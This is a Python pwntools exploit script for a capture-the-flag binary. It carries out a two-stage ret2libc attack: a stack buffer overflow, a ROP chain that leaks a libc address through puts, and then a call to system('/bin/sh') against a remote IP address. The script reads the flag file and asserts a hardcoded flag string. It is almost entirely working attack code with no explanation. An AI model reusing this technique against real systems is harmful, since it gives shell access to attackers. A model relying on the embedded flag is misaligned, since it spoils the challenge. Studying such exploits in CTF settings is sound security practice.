from pwn import *

# context.log_level = "DEBUG"

e = ELF("./vuln")
puts_plt = 0x404018
puts = e.symbols["puts"]
read_plt = 0x404020
setvbuf_plt = 0x404028
main = 0x401146
pop_rdi = p64(0x401223)

if __debug__:
    p = process("./vuln")
else:
    p = remote("35.188.73.186", 1111)

intro = "What do you want me to echo back> "
p.recvline(intro)

payload = "A" * 0x108
payload += pop_rdi
payload += p64(read_plt)
payload += p64(puts)
payload += p64(main)
p.send(payload)
p.recvline()

got = u64(p.recvline().strip().ljust(8, "\x00"))

# read: 470 in local, 070 in remote
# puts: a30 in local, 9c0 in remote
if __debug__:
    LIBC = got - 0xf7470
    system = LIBC + 0x443d0
    read = LIBC + 0xf7470
    write = LIBC + 0xf74d0
    binsh = LIBC + 0x18c3dd
else:
    LIBC = got - 0x110070
    system = LIBC + 0x4f440
    read = LIBC + 0x110070
    write = LIBC + 0x110140
    binsh = LIBC + 0x1b3e9a
log.success("LIBC: 0x{:x}".format(LIBC))
p.recvline(intro)

payload = "A" * 0x108
payload += pop_rdi
payload += p64(binsh)
payload += p64(system)
payload += pop_rdi
payload += p64(binsh)
payload += p64(system)
p.send(payload)
p.recv()

if not __debug__:
    p.sendline("cd; cat flag.txt")
    p.recvline()
    flag = p.recvline().strip()
    assert flag == "rooters{L0l_W3lc0m3_70_7h3_0f_Pwn1ng}ctf"
    log.success("flag = {:s}".format(flag))

p.interactive()
